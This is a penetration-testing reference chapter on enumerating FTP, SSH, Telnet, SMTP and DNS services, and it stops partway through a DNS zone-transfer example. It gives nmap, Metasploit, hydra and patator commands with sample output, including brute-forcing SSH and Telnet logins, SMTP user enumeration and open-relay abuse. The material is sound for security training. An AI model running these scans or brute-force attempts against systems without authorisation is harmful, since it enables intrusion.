synchronise<!-- TITLE: Service Enumeration -->
<!-- SUBTITLE: A quick summary of Service Enumeration -->

Common Services and Enumeration

I will try to make this chapter into a reference library. So that you can just check in this chapter to see common ways to exploit certain common services. I will only discuss the most common, since there are quite a few.

# Methodology

- **Enumerate**
  - Use steps below to exfiltrate as much data as we can from identified services.
  - Give all services the lookover before planning an attack vector.
- **Known Vulnerabilities**
  - Check if the service has any known publicly disclosed vulnerabilities.
- **Exploitable**
  - Search for any available public exploits, especially RCE which can provide a few easy wins.
- **Brute Forceable**
  - Always try common weak or default passwords.
  - Check for password re-use as soon as new credentials are disocvered.

# Port X - Service unknown

If you have a port open with unknown service you can do this to find out which service it might be.

```text
amap -d 192.168.19.244 8000
```

# Port 21 - FTP

Common FTP servers you may find:

"Alfresco Document Management System ftpd"
"D-Link Printer Server ftpd"
"FreeBSD ftpd 6.00LS"
"HP JetDirect ftpd"
"HP LaserJet P4014 printer ftpd"
"Konica Minolta bizhub printer ftpd"
"Microsoft ftpd"
"National Instruments LabVIEW ftpd"
"NetBSD lukemftpd"
"Nortel CES1010E router ftpd"
"oftpd"
"OpenBSD ftpd 6.4 Linux port 0.17"
"PacketShaper ftpd"
"ProFTPD 1.3.3"
"Pure-FTPd"
"Ricoh Aficio MP 2000 printer ftpd 6.15"
"Ricoh Aficio MP 2000 printer ftpd 6.17"
"Ricoh Aficio MP 2352 printer ftpd 10.67"
"Ricoh Aficio MP 4002 printer ftpd 11.103"
"Ricoh Aficio MP W3600 printer ftpd 6.15"
"Ricoh Aficio SP 3500SF printer ftpd 75905e"
"vsftpd"
"vsftpd 2.0.4+ (ext.3)"
"vsftpd 2.0.5"
"vsftpd 2.0.8 or later"
"vsftpd 2.2.2"
"vsftpd 3.0.2"
"vsftpd (before 2.0.8) or WU-FTPD"
"WU-FTPD or MIT Kerberos ftpd 5.60"
"WU-FTPD or MIT Kerberos ftpd 6.00L

Connect to the ftp-server to enumerate software and version

```text
ftp 192.168.1.101
nc 192.168.1.101 21
```

Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with `anonymous:anonymous`.

> If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them!  
> use `binary` or `ascii` commands to switch

## Nmap


```text
nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA 10.10.10.10_ftp_NSE 10.10.10.10
```

After obtaining all the required details, we can check for any publicly available exploits with `searchsploit`

## Metasploit


### FTP Version Scanner

This can be done using

```
use auxiliary/scanner/ftp/ftp_version
services -p 21 -R
```

Sample Output:

```
[*] 172.16.xx.xx:21 FTP Banner: '220 BDL095XXXX FTP server ready.\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
[*] Auxiliary module execution completed
```

### Anonymous FTP Access Detection

Detect anonymous (read/ write) FTP server access.

A sample of results is
```
[+] 10.10.xx.xx:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)
```

### FTP Authentication Scanner

FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.
```
use auxiliary/scanner/ftp/ftp_login
services -p 21 -R
```

## Summary

1. Grab banners and check version
2. Check for available exploits
3. Test for anonymous logins
4. Brute force if we know any user accounts

# Port 22 - SSH

SSH is such an old and fundamental technology so most modern version are quite hardened. We can start doing the standard checks:

* Grab banners to detect version
* Check authentication method, public_key or password?
* Attempt common passwords
* Brute force

## SSH Enumeration

You can find out the version of the SSH either but scanning it with nmap or by connecting with it using `nc`.

```text
nc 192.168.1.10 22
```

It returnes something like this:  
`SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1`

This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. [http://www.openssh.com/txt/rfc4253.txt](http://www.openssh.com/txt/rfc4253.txt)  
The protocol-version string should be defined like this: `SSH-protoversion-softwareversion SP comments CR LF`  
Where comments is optional. And SP means space, and CR \(carriege return\) and LF \(Line feed\)  
So basically the comments should be separated by a space.

## Brute force

Using `hydra`

```text
hydra -L /home/10.10.10.228/loot/userlist.txt -e nsr 10.10.10.228 -s 22 ssh
hydra -L /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100.txt -e nsr 10.10.10.228 -s 22 ssh
```

### Summary

- If SSH is enabled, make note of it as it may be leveraged later on in further attacks
  - Injection attacks enabling us to write our own RSA key and obtain SSH access
  - Brute force

# Port 23 - Telnet

Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out.

## Brute forcing telnet

You can also brute force it like this:

```text
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
```

# Port 25 - SMTP

SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. Here are some things to we can do when enumerating a SMTP server:

## Checklist
- Grab banners and version
- Check vulnerabilities and exploits
- Check for open-relay
- Check supports commands
- Use VRFY to enumerate users

## Metasploit

### SMTP Version

SMTP Banner Grabber.

```
use auxiliary/scanner/smtp/smtp_version
services -p 25 -u -R
```
Sample Output

```
[*] 10.10.xx.xx:25 SMTP 220 xxxx.example.com Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:22:44 +0530 \x0d\x0a
[*] 10.10.xx.xx:25 SMTP 220 smtpsrv.example.com ESMTP Sendmail; Thu, 3 Mar 2016 18:22:39 +0530\x0d\x0a
```

### SMTP Open Relays

Tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods

```
use auxiliary/scanner/smtp/smtp_relay
services -p 25 -u -R
```

You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.

Sample Output:

```
[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:<sender@example.com> -> RCPT TO:<target@example.com>
[*] 172.16.xx.xx:25 - No relay detected
[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:<sender@example.com> -> RCPT TO:<target@example.com>
```

### SMTP User Enumeration Utility

Allows the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.

```
use auxiliary/scanner/smtp/smtp_enum
services -p 25 -u -R
```

Sample Output:

```
[*] 10.10.xx.xx:25 Skipping microsoft (220 ftpsrv Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:49:49 +0530)
[+] 10.10.xx.xx:25 Users found: adm, admin, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
```

## Nmap NSE scripts

- **smtp-brutes** : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.

- **smtp-commands** : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.

- **smtp-user-enum** : Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP ENUM in metasploit.

```text
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
```

- **smtp-open-relay** : Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.

Sample Output:

```
nmap -iL email_servers -v --script=smtp-open-relay -p 25
Nmap scan report for 10.10.xx.xx
Host is up (0.00039s latency).
PORT     STATE  SERVICE
25/tcp   open   smtp
| smtp-open-relay: Server is an open relay (14/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@sysmailsrv.example.com> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.10.8.136]>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest%nmap.scanme.org@sysmailsrv.example.com>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest%nmap.scanme.org">
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest@nmap.scanme.org"@[10.10.8.136]>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<@[10.10.8.136]:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<@sysmailsrv.example.com:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.10.8.136]>
|_ MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest@sysmailsrv.example.com>
MAC Address: 00:50:56:B2:21:A9 (VMware)
```

## Command Reference

### Nmap NSE scan using common SMTP scripts

```text
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.140 -oA 10.10.10.140_smtp_NSE
```


## Other

### SMTP Commands

SMTP supports the below commands:

```
ATRN   Authenticated TURN
AUTH   Authentication
BDAT   Binary data
BURL   Remote content
DATA   The actual email message to be sent. This command is terminated with a line that contains only a .
EHLO   Extended HELO
ETRN   Extended turn
EXPN   Expand
HELO   Identify yourself to the SMTP server.
HELP   Show available commands
MAIL   Send mail from email account
MAIL FROM: me@mydomain.com
NOOP   No-op. Keeps you connection open.
ONEX   One message transaction only
QUIT   End session
RCPT   Send email to recipient
RCPT TO: you@yourdomain.com
RSET   Reset
SAML   Send and mail
SEND   Send
SOML   Send or mail
STARTTLS
SUBMITTER      SMTP responsible submitter
TURN   Turn
VERB   Verbose
VRFY   Verify
```

### Send an email via telnet

The following is an actual SMTP session. All sessions must start with HELO and end with QUIT.

```
HELO my.server.com
MAIL FROM: <me@mydomain.com>
RCPT TO: <you@yourdomain.com>
DATA
From: Danny Dolittle
To: Sarah Smith
Subject: Email sample
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii

This is a test email for you to read.
.
QUIT
```

### Verifying users

```text
nc 192.168.1.103 25                                                                               

220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY roooooot
550 5.1.1 <roooooot>: Recipient address rejected: User unknown in local recipient table
```

### Using Patator

```text
patator smtp_vrfy host=10.10.10.228 user=FILE0 0=/usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt timeout=15 -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421
```

Sample Output:

```text
07:29:37 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-04-08 07:29 AEST
07:29:37 patator    INFO -                                                                              
07:29:37 patator    INFO - code  size   time | candidate                          |   num | mesg
07:29:37 patator    INFO - -----------------------------------------------------------------------------
07:29:51 patator    INFO - 252   12    1.004 | backup                             |   135 | 2.0.0 backup
07:30:50 patator    INFO - 252   11    0.002 | games                              |   682 | 2.0.0 games
07:31:11 patator    INFO - 252   9     0.004 | irc                                |   821 | 2.0.0 irc
07:31:17 patator    INFO - 252   10    1.006 | mail                               |   956 | 2.0.0 mail
07:31:32 patator    INFO - 252   10    0.001 | news                               |  1093 | 2.0.0 news
07:31:59 patator    INFO - 252   11    1.002 | proxy                              |  1360 | 2.0.0 proxy
07:32:15 patator    INFO - 252   10    0.001 | root                               |  1425 | 2.0.0 root
07:32:26 patator    INFO - 252   12    1.004 | syslog                             |  1606 | 2.0.0 syslog
07:32:38 patator    INFO - 252   10    1.003 | user                               |  1714 | 2.0.0 user
```

## Summary

- Compile list of enumerated users
  - Can be used to brute force other services or web applications
- Launch client-side attacks using open-relay
- Sending malicious email to a verified user

## Reference list

[https://cr.yp.to/smtp/vrfy.html](https://cr.yp.to/smtp/vrfy.html)

[http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/](http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/)

[http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html](http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html)

[http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)

[https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/](https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/)

# Port 53 - DNS

## Metasploit

### DNS Bruteforce Enumeration

Uses a dictionary to perform a bruteforce attack to enumerate hostnames and subdomains available under a given domain

    use auxiliary/gather/dns_bruteforce

Sample Output:

    [+] Host autodiscover.example.com with address 10.10.xx.xx found
    [+] Host b2b.example.com with address 10.10.xx.xx found
    [+] Host blog.example.com with address 10.10.xx.xx found

### DNS Basic Information Enumeration

Module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.

    use auxiliary/gather/dns_info

Sample Output:
```
    [*] Enumerating example.com
    [+] example.com - Address 93.184.xx.xx found. Record type: A
    [+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA
    [+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS
    [+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS
    [+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS
    [+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS
    [+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA
    [+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA
    [+] example.com - Text info found: v=spf1 -all . Record type: TXT
    [+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT
    [*] Auxiliary module execution completed
```

### DNS Reverse Lookup Enumeration

Module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.

    use auxiliary/gather/dns_reverse_lookup

### DNS Common Service Record Enumeration

Module enumerates common DNS service records in a given domain.

Sample Output:
```
    use auxiliary/gather/dns_srv_enum
    set domain example.com
    run

    [*] Enumerating SRV Records for example.com
    [+] Host: sipfed.online.lync.com IP: 10.10.xx.xx Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
    [+] Host: sipfed.online.lync.com IP: 2a01:XXX:XXXX:2::b Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
    [*] Auxiliary module execution completed
```
### DNS Record Scanner and Enumerator

Module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.

    use auxiliary/gather/enum_dns

Sample Output:
```
    [*] Setting DNS Server to zonetransfer.me NS: 81.4.xx.xx
    [*] Retrieving general DNS records
    [*] Domain: zonetransfer.me IP address: 217.147.xx.xx Record: A
    [*] Name: ASPMX.L.GOOGLE.COM. Preference: 0 Record: MX
    [*] Name: ASPMX3.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ALT1.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
    [*] Name: ASPMX5.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ASPMX2.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ASPMX4.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ALT2.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
    [*] zonetransfer.me.        301     IN      TXT
    [*] Text: zonetransfer.me.        301     IN      TXT
    [*] Performing zone transfer against all nameservers in zonetransfer.me
    [*] Testing nameserver: nsztm2.digi.ninja.
    W, [2016-04-05T22:53:16.834590 #15019]  WARN -- : AXFR query, switching to TCP
    W, [2016-04-05T22:53:17.490698 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
    W, [2016-04-05T22:53:32.047468 #15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one
    F, [2016-04-05T22:53:32.047746 #15019] FATAL -- : No response from nameservers list: aborting
    [-] Zone transfer failed (length was zero)
    [*] Testing nameserver: nsztm1.digi.ninja.
    W, [2016-04-05T22:53:33.269318 #15019]  WARN -- : AXFR query, switching to TCP
    W, [2016-04-05T22:53:33.804121 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
    W, [2016-04-05T22:53:48.481319 #15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one
    F, [2016-04-05T22:53:48.481519 #15019] FATAL -- : No response from nameservers list: aborting
    [-] Zone transfer failed (length was zero)
    [*] Enumerating SRV records for zonetransfer.me
    [*] SRV Record: _sip._tcp.zonetransfer.me Host: www.zonetransfer.me. Port: 5060 Priority: 0
    [*] Done
    [*] Auxiliary module execution completed
```
Two interesting metasploit modules which we found are

### DNS Amplification Scanner

Test for the DNS Amplification Tests.

    auxiliary/scanner/dns/dns_amp
    services -p 53 -u -R

Sample Output:
```
    [*] Sending 67 bytes to each host using the IN ANY isc.org request
    [+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
    [+] 10.10.xx.xx:53 - Response is 417 bytes [6.22x Amplification]
    [+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
    [+] 10.10.xx.xx:53 - Response is 230 bytes [3.43x Amplification]
```
### DNS Non-Recursive Record Scraper

Can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.

    use auxiliary/gather/dns_cache_scraper

Sample Output:
```
    [*] Making queries against 103.8.xx.xx
    [+] dnl-01.geo.kaspersky.com - Found
    [+] downloads2.kaspersky-labs.com - Found
    [+] liveupdate.symantecliveupdate.com - Found
    [+] liveupdate.symantec.com - Found
    [+] update.symantec.com - Found
    [+] update.nai.com - Found
    [+] guru.avg.com - Found
    [*] Auxiliary module execution completed
```
## Nmap

Nmap has around 19-20 NSE Scripts for DNS, we haven’t mentioned all the NSE here, only which we were able to use.:

### Broadcast-dns-service-discovery

<a href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html" class="reference external">broadcast-dns-service-discovery.nse</a> : Attempts to discover hosts’ services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.

Sample Output:

    nmap --script=broadcast-dns-service-discovery

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-12 14:53 IST
    Pre-scan script results:
    | broadcast-dns-service-discovery:
    |   172.30.xx.xx
    |     9/tcp workstation
    |       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
    |     22/tcp udisks-ssh
    |       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
    |   172.30.xx.xx
    |     2020/tcp teamviewer
    |       DyngateID=164005815
    |       Token=CrzebHH5rkzIEBsP
    |       UUID=119e36d8-4366-4495-9e13-c44be02851f0
    |_      Address=172.30.xx.xx fe80:0:0:0:69ab:44d5:e21d:738e
    WARNING: No targets were specified, so 0 hosts scanned.
    Nmap done: 0 IP addresses (0 hosts up) scanned in 7.24 seconds

It’s surprising why teamviewer will broadcast its ID, then we mostly need 4 digit pin just to control the machine.

### DNS-blacklist

<a href="https://nmap.org/nsedoc/scripts/dns-blacklist.html" class="reference external">dns-blacklist.nse</a> (External IP Only) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged

### DNS-brute

<a href="https://nmap.org/nsedoc/scripts/dns-brute.html" class="reference external">dns-brute.nse</a> : This is similar to the msf dns\_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.

Sample Output:

    nmap --script dns-brute www.example.com -sn -n -Pn

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:23 IST
    Nmap scan report for www.example.com (116.50.xx.xx)
    Host is up.
    Other addresses for www.example.com (not scanned): 64:ff9b::7432:4fd0

    Host script results:
    | dns-brute:
    |   DNS Brute-force hostnames:
    |     mx1.example.com - 64:ff9b:0:0:0:0:cbc7:2989
    |     images.example.com - 116.50.xx.xx
    |     images.example.com - 64:ff9b:0:0:0:0:7432:404b
    |     dns.example.com - 116.50.xx.xx
    |     dns.example.com - 64:ff9b:0:0:0:0:7432:42e6
    |     web.example.com - 203.199.xx.xx
    |     web.example.com - 64:ff9b:0:0:0:0:cbc7:2911
    |     exchange.example.com - 203.199.xx.xx
    |     mail.example.com - 116.50.xx.xx
    |     exchange.example.com - 64:ff9b:0:0:0:0:cbc7:29a7
    |     mail.example.com - 64:ff9b:0:0:0:0:7432:4fe7
    |     blog.example.com - 116.50.xx.xx
    |     blog.example.com - 64:ff9b:0:0:0:0:7432:4ebb
    |     www.example.com - 116.50.xx.xx
    |     www.example.com - 64:ff9b:0:0:0:0:7432:4fd0
    |     sip.example.com - 116.50.xx.xx
    |     sip.example.com - 116.50.xx.xx
    |     sip.example.com - 64:ff9b:0:0:0:0:7432:4e56
    |     sip.example.com - 64:ff9b:0:0:0:0:7432:4ec9
    |     mobile.example.com - 116.50.xx.xx
    |_    mobile.example.com - 64:ff9b:0:0:0:0:7432:4e18

    Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds

### DNS-Cache-snoop

<a href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html" class="reference external">dns-cache-snoop.nse</a> : This module is similar to dns\_cache\_scraper. Perform DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with “www.” and once without. Use the dns-cache-snoop.domains script argument to use a different list.

Sample Output with no arguments:

    nmap -sU -p 53 --script dns-cache-snoop.nse 103.8.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:30 IST
    Nmap scan report for ns5.xxxxxx.co.in (103.8.xx.xx)
    Host is up (0.067s latency).
    PORT   STATE SERVICE
    53/udp open  domain
    | dns-cache-snoop: 83 of 100 tested domains are cached.
    | google.com
    | www.google.com
    | facebook.com
    | www.facebook.com
    | youtube.com
    | www.youtube.com
    | yahoo.com
    | www.yahoo.com

Sample Output with custom list of websites:
```
    nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}' 103.8.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:33 IST
    Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
    Host is up (0.11s latency).
    PORT   STATE SERVICE
    53/udp open  domain
    | dns-cache-snoop: 2 of 3 tested domains are cached.
    | dnl-01.geo.kaspersky.com
    |_update.symantec.com
```

### DNS-Check-zone

<a href="https://nmap.org/nsedoc/scripts/dns-check-zone.html" class="reference external">dns-check-zone.nse</a> : Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.

Sample Output:

    nmap -sn -Pn aster.example.co.in --script dns-check-zone --script-args='dns-check-zone.domain=example.com'

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:33 IST
    Nmap scan report for aster.example.co.in (202.191.xx.xx)
    Host is up.
    Other addresses for aster.example.co.in (not scanned): 64:ff9b::cabf:9a42
    rDNS record for 202.191.xx.xx: segment-202-191.sify.net
    Host script results:
    | dns-check-zone:
    | DNS check results for domain: example.com
    |   MX
    |     PASS - Reverse MX A records
    |       All MX records have PTR records
    |   SOA
    |     PASS - SOA REFRESH
    |       SOA REFRESH was within recommended range (3600s)
    |     PASS - SOA RETRY
    |       SOA RETRY was within recommended range (600s)
    |     PASS - SOA EXPIRE
    |         SOA EXPIRE was within recommended range (1209600s)
    |     PASS - SOA MNAME entry check
    |       SOA MNAME record is listed as DNS server
    |     PASS - Zone serial numbers
    |       Zone serials match
    |   NS
    |     FAIL - Recursive queries
    |       The following servers allow recursive queries: 45.33.xx.xx
    |     PASS - Multiple name servers
    |       Server has 2 name servers
    |     PASS - DNS name server IPs are public
    |       All DNS IPs were public
    |     PASS - DNS server response
    |       All servers respond to DNS queries
    |     PASS - Missing nameservers reported by parent
    |       All DNS servers match
    |     PASS - Missing nameservers reported by your nameservers
    |_      All DNS servers match

    Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds

### DNS-nsid

<a href="https://nmap.org/nsedoc/scripts/dns-nsid.html" class="reference external">dns-nsid.nse</a> : Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.

Sample Output:

    nmap -sSU -p 53 --script dns-nsid 202.191.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:37 IST
    Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
    Host is up (0.097s latency).
    PORT   STATE SERVICE
    53/tcp open  domain
    53/udp open  domain
    | dns-nsid:
    |_  bind.version: 9.3.3rc2

    Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds

### DNS-recursion

<a href="https://nmap.org/nsedoc/scripts/dns-recursion.html" class="reference external">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.

Sample Output:
```
    nmap -sU -p 53 --script=dns-recursion 202.191.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:39 IST
    Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
    Host is up (0.094s latency).
    PORT   STATE SERVICE
    53/udp open  domain
    |_dns-recursion: Recursion appears to be enabled

    Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
```
### DNS-Service-Discovery

<a href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html" class="reference external">dns-service-discovery.nse</a> : Attempts to discover target hosts’ services using the DNS Service Discovery protocol. The script first sends a query for \_services.\_dns-sd.\_udp.local to get a list of services. It then sends a followup query for each one to try to get more information.

Sample Output:

    Yet to run
    nmap --script=dns-service-discovery -p 5353 <target>

### DNS-SRV-Enum

<a href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html" class="reference external">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:

-   Active Directory Global Catalog
-   Exchange Autodiscovery
-   Kerberos KDC Service
-   Kerberos Passwd Change Service
-   LDAP Servers
-   SIP Servers
-   XMPP S2S
-   XMPP C2S

Sample Output:

    Yet to run

### DNS-Zone-Transfer

<a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html" class="reference external">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.

Sample Output:
```
    nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:49 IST
    Nmap scan report for nsztm2.digi.ninja (167.88.xx.xx)
    Host is up (0.29s latency).
    Other addresses for nsztm2.digi.ninja (not scanned): 64:ff9b::a758:2a5e
    rDNS record for 167.88.xx.xx: zonetransfer.me
    Not shown: 996 closed ports
    PORT     STATE    SERVICE
    53/tcp   open     domain
    | dns-zone-transfer:
    | zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
    | zonetransfer.me.                                HINFO  "Casio fx-700G" "Windows XP"
    | zonetransfer.me.                                TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
    | zonetransfer.me.                                MX     0 ASPMX.L.GOOGLE.COM.
    | zonetransfer.me.                                MX     10 ALT1.ASPMX.L.GOOGLE.COM.
    | zonetransfer.me.                                MX     10 ALT2.ASPMX.L.GOOGLE.COM.
    | zonetransfer.me.                                MX     20 ASPMX2.GOOGLEMAIL.COM.
    | zonetransfer.me.                                MX     20 ASPMX3.GOOGLEMAIL.COM.
    | zonetransfer.me.                                MX     20 ASPMX4.GOOGLEMAIL.COM.
    | zonetransfer.me.                                MX     20 ASPMX5.GOOGLEMAIL.COM.
    | zonetransfer.me.                                A      217.147.xx.xx
    | zonetransfer.me.                                NS     nsztm1.digi.ninja.
    | zonetransfer.me.                                NS     nsztm2.digi.ninja.
    | _sip._tcp.zonetransfer.me.                      SRV    0 0 5060 www.zonetransfer.me.
    | 157.177.xx.xx.IN-ADDR.ARPA.zonetransfer.me.   PTR    www.zonetransfer.me.
